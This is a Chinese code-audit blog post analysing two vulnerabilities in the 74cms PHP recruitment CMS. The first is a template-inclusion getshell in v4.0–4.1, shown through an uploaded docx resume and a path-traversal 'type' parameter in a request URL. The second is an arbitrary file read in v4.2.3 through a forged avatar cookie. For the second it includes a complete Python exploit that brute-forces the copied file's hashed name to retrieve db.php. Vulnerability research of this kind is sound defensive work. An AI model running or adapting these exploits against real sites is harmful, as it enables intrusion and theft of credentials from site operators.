---
title: 74cms 漏洞分析
url: 386.html
id: 386
categories:
  - php
  - 代码审计
date: 2018-06-06 17:56:04
tags:
---

# 74cms v4.0-v4.1 前台getshell
参考[文章](http://0day5.com/archives/4257/) 漏洞发生在`\Application\Home\Controller\MController.class.php`中 代码如下
```php
    	public function index(){
    		if(!I('get.org','','trim') && C('PLATFORM') == 'mobile' && $this->apply['Mobile']){
                redirect(build_mobile_url());
    		}
            $type = I('get.type','android','trim');
            $android_download_url = C('qscms_android_download')?C('qscms_android_download'):'http://demo2.7yun.com/phone/apk/74cms.apk';
            $ios_download_url = C('qscms_ios_download')?C('qscms_ios_download'):'';
            $this->assign('android_download_url',$android_download_url);
            $this->assign('ios_download_url',$ios_download_url);
            $this->assign('type',$type);
            $this->display('M/'.$type);
        }
```
可以看到在获取了用户传递进来的`$type`变量之后，直接带入`display`函数，`display`函数在thinkphp中一般是用来显示模板html文件。 
不妨跟进看一下 `ThinkPHP\Library\Think\Controller.class.php`中的display函数仅仅调用了下view中的函数
```php
        protected function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') {
            $this->view->display($templateFile,$charset,$contentType,$content,$prefix);
        }
```
再次跟进
```php
        public function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') {
            G('viewStartTime');
            // 视图开始标签
            Hook::listen('view_begin',$templateFile);
            // 解析并获取模板内容
            $content = $this->fetch($templateFile,$content,$prefix);
            // 输出模板内容
            $this->render($content,$charset,$contentType);
            // 视图结束标签
            Hook::listen('view_end');
        }
```
主要就是获取模板内容，也就是之前display传入的参数，然后解析并输出。  
然而thinkphp试允许用户在template中使用php代码的 
![](http://blog.kingkk.com/wp-content/uploads/2018/06/55e1cd211612f28da7ae0b055d18dc37.png) 
然后就是要找一个可以上传文件的点，图片上传会被进行处理，这里我们选择上传docx个人简历 
![](http://blog.kingkk.com/wp-content/uploads/2018/06/73453cfc4d75bfb2699a0e2cfe91a9bb.png) 
返回的json中能看到文件的路径 
![](http://blog.kingkk.com/wp-content/uploads/2018/06/0a550deee4cbe9ce70b6a9ed8c3277cd.png) 
这样就可以包含这个伪造的template 
index.php?m=&c=M&a=index&type=../data/upload/word_resume/1806/06/5b17a62407bac.docx 
![](http://blog.kingkk.com/wp-content/uploads/2018/06/3055c0c1dbab38eb9083f302779005b1.png)  



# 74cms v4.2.3 任意文件读取


漏洞发生在`\Application\Home\Controller\MembersController.class.php`文件中，219行的位置处
```php
                if('bind' == I('post.org','','trim') && cookie('members_bind_info')){
                    $user_bind_info = object_to_array(cookie('members_bind_info'));
                    $user_bind_info['uid'] = $data['uid'];
                    $oauth = new \Common\qscmslib\oauth($user_bind_info['type']);
                    $oauth->bindUser($user_bind_info);
                    $this->_save_avatar($user_bind_info['temp_avatar'],$data['uid']);//临时头像转换
                    cookie('members_bind_info', NULL);//清理绑定COOKIE
                }
```
这里能看到程序接受了post传递过来的org参数，以及cookie中的members\_bind\_info数组 
然后实例化了一个oauth类，然后生成了个临时头像，查看一下\_save\_avatar的代码 
大约在571行处
```php
        protected function _save_avatar($avatar,$uid){
            if(!$avatar) return false;
            $path = C('qscms_attach_path').'avatar/temp/'.$avatar;
            $image = new \Common\ORG\ThinkImage();
            $date = date('ym/d/');
            $save_avatar=C('qscms_attach_path').'avatar/'.$date;//图片存储路径
            if(!is_dir($save_avatar)) mkdir($save_avatar,0777,true);
            $savePicName = md5($uid.time()).".jpg";
            $filename = $save_avatar.$savePicName;
            $size = explode(',',C('qscms_avatar_size'));
            copy($path, $filename);
            foreach ($size as $val) {
                $image->open($path)->thumb($val,$val,3)->save("{$filename}._{$val}x{$val}.jpg");
            }
            M('Members')->where(array('uid'=>$uid))->setfield('avatars',$date.$savePicName);
            @unlink($path);
        }
```
这里能看到将传入的第一个参数进行路径的拼接，然后直接将内容存入一个.jpg的图片文件中 在之前的代码中能看到
```php
…
$user_bind_info = object_to_array(cookie('members_bind_info'));
……
$this->_save_avatar($user_bind_info['temp_avatar'],$data['uid']);
```
传入的第一个参数是直接从cookie中获取的，而cookie恰巧也是我们能够伪造的。就可以利用相对路径进行路径跳转。 
图片也是可以直接进行下载的，从而引发任意文件读取。 

接下来看下需要达成任意文件读取所需要的一些条件

*   ajax==1,reg_type==2,utype==2,ucenter==bind,org=bind  (post中的数据)
*   members\_bind\_info\[type\] == qq/ sina / tabao
*   members\_bind\_info\[username\] 不能重复
*   members\_bind\_info\[uid\] 需要设置一个未被注册的id
*   members\_bind\_info\[temp_avatar\]则是要读取的文件路径

最后就是要知道被移动的文件位置。

data\\upload\\avatar\\1806\\11\\1db0ab21cfccf510759cf4b2ec60ba7c.jpg

可以看到是在upload下一个时间的文件夹，文件名则是一串哈希值，哈希的生成规律如下
```php
    $savePicName = md5($uid.time()).".jpg";
```
由uid和时间time以同进行哈希得到的值。最后exp如下
```python
    #encoding=utf8
    import time, random, string, hashlib 
    import requests
    
    def post_exp():
    	url = root_url+'/index.php'
    	username = ''.join(random.sample(string.ascii_letters, 6))
    	uid = random.randint(100,999999)
    	params = {'m':'','c':'members','a':'register'}
    	data = {'ajax':'1','org':'bind','reg_type':'2','utype':'2','ucenter':'bind'}
    	cookies = {	'members_bind_info[temp_avatar]':'../../../../Application/Common/Conf/db.php',
    				'members_bind_info[type]':'qq',
    				'members_uc_info[password]':username,
    				'members_uc_info[uid]':str(uid),
    				'members_uc_info[username]':username
    				}
    	r = requests.post(url,params=params,data=data,cookies=cookies)
    	pic_time = int(time.time())
    	return uid,pic_time
    
    def get_picname(uid,pic_time):
    	localtime = time.localtime(pic_time)
    	unhash_name = str(uid)+str(pic_time)
    	hash_name = hashlib.md5(unhash_name.encode('utf8')).hexdigest()+'.jpg'
    	pic_url = root_url+'/data/upload/avatar/{}{}/{}/'.format(str(localtime[0])[2:],str(localtime[1]).zfill(2),localtime[2])+hash_name
    	return pic_url
    
    def main():	
    	global root_url
    	root_url = 'http://localhost/74cms4.2.3'
    
    	uid,pic_time = post_exp()
    	for pt in range(pic_time-10,pic_time+10):
    		pic_url = get_picname(uid,pt)
    		r = requests.get(pic_url)
    		if r.status_code == 200:
    			print("Vulnerable!")
    			print(r.text)
    			exit()
    
    		print(pt,pic_url,r)
    	print("may be unvulnerable")
    		
    
    if __name__ == '__main__':
    	main()
```
成功读取到db.php配置文件 ![](http://blog.kingkk.com/wp-content/uploads/2018/06/eb2555624262d4b37878019f9183efb5.png)